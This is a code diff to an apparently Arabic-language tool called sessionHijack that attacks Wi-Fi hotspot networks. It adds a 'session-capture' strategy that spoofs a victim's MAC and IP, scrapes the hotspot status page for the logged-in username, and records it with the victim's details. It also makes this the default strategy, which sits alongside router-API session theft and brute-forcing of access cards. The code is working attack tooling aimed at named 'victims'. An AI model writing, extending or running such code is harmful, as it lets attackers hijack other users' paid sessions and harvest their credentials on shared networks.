@@ -153,6 +153,39 @@ async function detectHotspot(gatewayIp, ssid, victimMac, victimIp) {
   return { found: false, url: null, sessionActive: false, reason: `فشلت كل الـ URLs (${tryUrls.length})` };
 }
 
+async function trySessionCapture(gatewayIp, ssid, targetMac, targetIp) {
+  const tryUrls = [
+    'http://m.net/status',
+    gatewayIp ? `http://${gatewayIp}/status` : null,
+    gatewayIp ? `http://${gatewayIp}/` : null,
+  ].filter(Boolean);
+
+  let lastuser = null;
+  for (let i = 0; i < 3; i++) {
+    await sleep(300);
+    for (const url of tryUrls) {
+      try {
+        const resp = await axios.get(url, { timeout: 2000, validateStatus: () => true });
+        const html = typeof resp.data === 'string' ? resp.data : '';
+        if (html && html.length > 50) {
+          const lu = credentialCapture.parseLastuser(html);
+          if (lu) { lastuser = lu; emitLog(`👤 تم اكتشاف lastuser: ${lastuser}`, 'success'); break; }
+        }
+      } catch {}
+    }
+    if (lastuser) break;
+  }
+
+  if (lastuser) {
+    credentialCapture.addCredential(lastuser, {
+      source: 'hijack-session-capture',
+      victimMac: targetMac || '', victimIp: targetIp || '',
+      ssid: ssid || '', gatewayIp: gatewayIp || '',
+    });
+  }
+  return { success: true, sessionInfo: { sessionActive: true, lastuser } };
+}
+
 async function checkSessionViaStatus(baseUrl, maxAttempts = 5, extra = {}) {
   const statusUrl = baseUrl.replace(/\/+$/, '').replace(/\/index\.html$/, '') + '/status';
   for (let i = 0; i < maxAttempts; i++) {
@@ -339,24 +372,30 @@ async function tryBruteForce(hotspotUrl) {
 async function trySmartAuto(targetIp, targetMac, gatewayIp) {
   emitLog('🧠 تشغيل الوضع الذكي — تجربة جميع الاستراتيجيات');
 
+  emitLog('🎯 1/5 اقتناص الجلسة...');
+  const capResult = await trySessionCapture(gatewayIp, '', targetMac, targetIp);
+  if (capResult.success) {
+    return { strategy: 'session-capture', ...capResult };
+  }
+
   const api = getMikrotikApi();
 
   if (api.enabled) {
-    emitLog('📡 1/4 التحقق من API الراوتر...');
+    emitLog('📡 2/5 التحقق من API الراوتر...');
     const apiResult = await tryApiSessionSteal(targetIp, targetMac);
     if (apiResult.success) {
       return { strategy: 'api-session', ...apiResult };
     }
   }
 
-  emitLog('⏳ 2/4 انتظار الجلسة (30 ثانية)...');
+  emitLog('⏳ 3/5 انتظار الجلسة (30 ثانية)...');
   const hotspotUrl = hotspotAuth.getConfig().url || `http://${gatewayIp || 'm.net'}/`;
   const waitResult = await checkSessionViaStatus(hotspotUrl, 30);
   if (waitResult.sessionActive) {
     return { strategy: 'session-wait', success: true, sessionInfo: waitResult };
   }
 
-  emitLog('⚡ 3/4 تخمين الكروت...');
+  emitLog('⚡ 4/5 تخمين الكروت...');
   const bruteResult = await tryBruteForce(hotspotUrl);
   if (bruteResult.success) {
     return { strategy: 'brute-force', ...bruteResult };
@@ -364,7 +403,7 @@ async function trySmartAuto(targetIp, targetMac, gatewayIp) {
 
   const availableCards = sessionStore.getCards().filter(c => c.status === 'ready' || c.status === 'active');
   if (availableCards.length >= 5) {
-    emitLog(`💳 4/4 تسجيل الدخول بالكروت (${availableCards.length} متاح)...`);
+    emitLog(`💳 5/5 تسجيل الدخول بالكروت (${availableCards.length} متاح)...`);
     const cardResult = await tryCardLogin(hotspotUrl);
     if (cardResult.success) {
       return { strategy: 'card-login', ...cardResult };
@@ -510,6 +549,7 @@ const sessionHijack = {
         else if (strategyUsed === 'api-session') errorMsg = 'لا توجد جلسة نشطة للهدف في الراوتر';
         else if (strategyUsed === 'brute-force') errorMsg = 'فشل تخمين الكروت';
         else if (strategyUsed === 'smart-auto') errorMsg = 'فشلت جميع الاستراتيجيات المتاحة';
+        else if (strategyUsed === 'session-capture') errorMsg = 'فشل اقتناص الجلسة';
         else errorMsg = 'فشل الاختراق';
       }
 
@@ -535,7 +575,7 @@ const sessionHijack = {
       return { isSuccess: false, value: result, error: err.message, statusCode: 500 };
     };
 
-    const strategy = options.strategy || 'smart-auto';
+    const strategy = options.strategy || 'session-capture';
     logger.info(`Starting hijack: ${targetIp} / ${targetMac} [strategy: ${strategy}]`);
     emitLog(`🚀 بدء اختراق ${targetIp} (${STRATEGY_LABELS[strategy]?.label || strategy})`);
 
@@ -698,21 +738,27 @@ const sessionHijack = {
       const [macOk, ipOk] = await Promise.all([verifyMac(), options.forceIp ? verifyIp() : Promise.resolve(false)]);
 
       if (macOk && (!options.forceIp || ipOk)) {
-        emitLog(`✅✅✅ اختراق ناجح! MAC=${targetMac}${options.forceIp ? ' IP=' + options.forceIp : ''}`, 'success');
-        emitStep('verify_mac_ip', 'done', { mac: macOk, ip: ipOk });
-        hijackProgress.progress = 90;
-        try {
-          const { quickCheck } = require('./wifi-manager');
-          const q = await quickCheck();
-          credentialCapture.addCredential('(hijacked:' + targetMac.replace(/:.*/, '') + '...)', {
-            source: 'hijack-mac-ip-spoof',
-            victimMac: targetMac, victimIp: targetIp,
-            ssid: (q && q.ssid) || options.ssid || '',
-            gatewayIp: gatewayIp || options.forceGateway || '',
-            remainingBytes: null, remainingTime: null,
-          });
-        } catch {}
-        return complete(true, { sessionActive: true, method: 'mac-ip-spoof', macVerified: macOk, ipVerified: ipOk }, null, strategy);
+        if (strategy === 'session-capture') {
+          emitLog(`✅ MAC متطابق — متابعة لاقتناص الـ lastuser`, 'success');
+          emitStep('verify_mac_ip', 'done', { mac: macOk, ip: ipOk });
+          hijackProgress.progress = 65;
+        } else {
+          emitLog(`✅✅✅ اختراق ناجح! MAC=${targetMac}${options.forceIp ? ' IP=' + options.forceIp : ''}`, 'success');
+          emitStep('verify_mac_ip', 'done', { mac: macOk, ip: ipOk });
+          hijackProgress.progress = 90;
+          try {
+            const { quickCheck } = require('./wifi-manager');
+            const q = await quickCheck();
+            credentialCapture.addCredential('(hijacked:' + targetMac.replace(/:.*/, '') + '...)', {
+              source: 'hijack-mac-ip-spoof',
+              victimMac: targetMac, victimIp: targetIp,
+              ssid: (q && q.ssid) || options.ssid || '',
+              gatewayIp: gatewayIp || options.forceGateway || '',
+              remainingBytes: null, remainingTime: null,
+            });
+          } catch {}
+          return complete(true, { sessionActive: true, method: 'mac-ip-spoof', macVerified: macOk, ipVerified: ipOk }, null, strategy);
+        }
       }
 
       if (!macOk) {
@@ -731,9 +777,14 @@ const sessionHijack = {
       ]);
 
       if (!detectedHotspot || !detectedHotspot.found) {
-        emitLog(`❌ لم يتم العثور على الهوتسبوت`, 'error');
-        emitStep('detect_hotspot', 'failed', null);
-        return complete(false, null, null, strategy);
+        if (strategy === 'session-capture') {
+          emitLog(`⚠️ لم يتم العثور على الهوتسبوت — استمرار رغم ذلك`, 'warn');
+          detectedHotspot = { found: true, url: gatewayIp ? `http://${gatewayIp}/status` : 'http://m.net/status', sessionActive: false };
+        } else {
+          emitLog(`❌ لم يتم العثور على الهوتسبوت`, 'error');
+          emitStep('detect_hotspot', 'failed', null);
+          return complete(false, null, null, strategy);
+        }
       }
 
       if (detectedHotspot.sessionActive) {
@@ -770,6 +821,9 @@ const sessionHijack = {
       } else if (strategy === 'smart-auto') {
         const smartResult = await trySmartAuto(targetIp, targetMac, gatewayIp);
         finalResult = { success: smartResult.success, sessionInfo: smartResult.sessionInfo, strategy: smartResult.strategy };
+      } else if (strategy === 'session-capture') {
+        emitLog(`🎯 اقتناص الجلسة — جلب الـ lastuser...`);
+        finalResult = await trySessionCapture(gatewayIp, currentSsid, targetMac, targetIp);
       }
 
       hijackProgress.progress = 90;
@@ -876,6 +930,14 @@ const sessionHijack = {
     }
 
     if (gatewayIp || hotspotAuth.getConfig().url) {
+      available.push({
+        id: 'session-capture',
+        icon: '🎯',
+        label: 'اقتناص الجلسة',
+        description: 'انتحال MAC وجلب lastuser مباشرة — أسرع استراتيجية',
+        confidence: 'high',
+        priority: 0,
+      });
       available.push({
         id: 'session-wait',
         icon: '⏳',
